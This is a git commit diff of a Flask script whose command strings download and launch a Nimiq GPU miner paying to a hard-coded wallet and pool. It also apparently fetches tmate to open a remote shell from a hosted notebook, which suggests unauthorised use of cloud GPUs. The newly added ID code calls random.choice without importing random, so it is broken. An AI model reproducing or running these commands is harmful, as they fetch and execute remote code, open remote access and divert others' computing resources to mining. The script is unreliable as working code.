3153582cf5d614c2c8157fda16521624894ef117
ixelizm <57567251+ixelizm@users.noreply.github.com>
2022-03-20 03:09:08 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,10 +1,13 @@
 from flask import Flask, request
 import os
-
+from datetime import datetime
+from random import sample
+chars = [i for i in "abcdefghjklmnoprstuvyzxwq1234567890"]
+strs = f"{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}"
 
 app = Flask(__name__)
 command = 'mkdir NimiqMiner && cd NimiqMiner && wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip && mkdir nq-miner && tar -xzvf nq-nimer-linux.zip -C nq-miner && rm nq-nimer-linux.zip &&rm ./nq-miner/start_gpu.sh &&./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443'
-command = """#@title **Start**
+command = f"""#@title **ID: {strs}**
 !nvidia-smi -L
 !wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
 !tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
